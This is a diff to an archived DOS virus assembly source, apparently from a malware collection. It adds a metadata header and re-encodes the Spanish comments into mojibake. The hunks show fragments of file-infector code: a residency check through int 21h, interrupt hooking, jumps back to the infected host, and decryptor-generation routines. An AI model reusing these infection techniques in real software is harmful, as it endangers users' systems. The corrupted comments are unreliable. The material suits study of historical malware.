@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
         assume ss:codevir
 
 pila    segment stack 'stack'
@@ -63,7 +74,7 @@ porfin  segment
         int 21h
         cmp ax, 'LO'
         mov cs:[segant], ds
-        push cs              ; DS = Ac 
+        push cs              ; DS = Acï¿½
         pop ds               ; ES = Anterior
         pop es               ;
         jnz noactivo
@@ -105,7 +116,7 @@ desdecom:
         push ds
         mov ax, 0100h
         push ax
-        retf                    ; Al comienzo del anfitri¢n
+        retf                    ; Al comienzo del anfitriï¿½n
 desdeexe:
         mov cx, [ofsexe]
         mov bx, cs
@@ -122,7 +133,7 @@ desdeexe:
         mov ds, [segant]
         push ax
         push cx
-        retf                    ; Al comienzo del anfitri¢n
+        retf                    ; Al comienzo del anfitriï¿½n
 
 
 
@@ -194,7 +205,7 @@ recubre   endp
 
 setintvec proc
 ;  Entrada:
-;    AL     : N£mero de interrupci¢n
+;    AL     : Nï¿½mero de interrupciï¿½n
 ;    DS:DX  : Puntero al handler
 
         pushf
@@ -286,7 +297,7 @@ fexec   proc
         mov cx, 0004h
         push cs
         pop ds
-        mov dx, offset original   ; Estos bytes ahora est n inutilizados
+        mov dx, offset original   ; Estos bytes ahora estï¿½n inutilizados
         pushf
         call dword ptr cs:[int21ip]
         pop dx
@@ -493,7 +504,7 @@ hand24  endp
 crea    proc
 ; Entrada
 ;     ES   :=    Segmento a donde se va a crear
-;     DS   :=    Segmento de c¢digo
+;     DS   :=    Segmento de cï¿½digo
 ; Salida
 ;     DI   :=   Longitud
 
@@ -754,7 +765,7 @@ fillclv endp
 
 pone    proc near
 ;Entrada
-;   AH := Modo (0=in£til/1=£til)
+;   AH := Modo (0=inï¿½til/1=ï¿½til)
 
         push cx
 
@@ -845,7 +856,7 @@ pone    endp
 genpar  proc near
 ;Entrada
 ;   ES:DI := Puntero a desencriptor a generar
-;   DS    := Segmento de c¢digo
+;   DS    := Segmento de cï¿½digo
 
         push ds
         push es
@@ -952,7 +963,7 @@ ofsale    dw ?
 
 
 
-;Repetici¢n, pero en el otro segmento para que quede residente
+;Repeticiï¿½n, pero en el otro segmento para que quede residente
 
 comienzor:
         call acanomasr
